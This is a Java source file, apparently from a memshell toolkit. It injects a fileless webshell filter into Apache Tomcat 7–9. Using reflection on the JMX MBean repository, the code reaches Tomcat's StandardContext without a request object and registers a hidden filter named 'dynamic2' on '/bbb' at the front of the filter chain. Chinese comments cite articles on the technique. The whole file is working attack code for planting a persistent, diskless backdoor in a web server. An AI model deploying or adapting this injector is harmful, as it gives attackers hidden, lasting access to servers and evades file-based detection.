package com.memshell.tomcat;

import com.memshell.generic.FilterTemplate;
import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;
import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.*;

public class FilterBasedWithoutRequest extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
//        参考：
//        《Tomcat源代码调试：看不见的Shell第一式》    https://www.freebuf.com/articles/web/151431.html
//        《基于tomcat的内存 Webshell 无文件攻击技术》    https://xz.aliyun.com/t/7388
//        《动态注册之Servlet+Filter+Listener》    https://www.jianshu.com/p/cbe1c3174d41
//        《基于Tomcat无文件Webshell研究》   https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA
//        《tomcat不出网回显连续剧第六集》   https://xz.aliyun.com/t/7535
//        《tomcat结合shiro无文件webshell的技术研究以及检测方法》     https://mp.weixin.qq.com/s/fFYTRrSMjHnPBPIaVn9qMg
//
//        适用范围: Tomcat 7 ~ 9

        try{
            String filterName = "dynamic2";
            String urlPattern = "/bbb";

            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository  = (Repository) field.get(obj);

            Set<NamedObject> objectSet =  repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            Iterator<NamedObject> iterator = objectSet.iterator();
            while(iterator.hasNext()) {
                try{
                    DynamicMBean dynamicMBean = iterator.next().getObject();
                    field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                    field.setAccessible(true);
                    obj = field.get(dynamicMBean);

                    field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                    field.setAccessible(true);
                    StandardContext standardContext = (StandardContext) field.get(obj);

                    field = standardContext.getClass().getDeclaredField("filterConfigs");
                    field.setAccessible(true);
                    HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);

                    if(map.get(filterName) == null){
                        System.out.println("[+] Add Dynamic Filter");

                        //生成 FilterDef
                        //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                        Class filterDefClass = null;
                        try{
                            filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                        }catch(ClassNotFoundException e){
                            filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                        }

                        Object filterDef = filterDefClass.newInstance();
                        filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, new Object[]{filterName});
                        Filter filter = new FilterTemplate();

                        filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, new Object[]{filter.getClass().getName()});
                        filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, new Object[]{filter});
                        standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, new Object[]{filterDef});

                        //设置 FilterMap
                        //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                        Class filterMapClass = null;
                        try {
                            filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                        } catch (ClassNotFoundException e) {
                            filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                        }

                        Object filterMap = filterMapClass.newInstance();
                        filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, new Object[]{filterName});
                        filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, new Object[]{DispatcherType.REQUEST.name()});
                        filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, new Object[]{urlPattern});
                        //调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了
                        standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});

                        //设置 FilterConfig
                        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(new Class[]{Context.class, filterDefClass});
                        constructor.setAccessible(true);
                        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
                        map.put(filterName, filterConfig);
                    }
                }catch(Exception e){
                    //pass
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}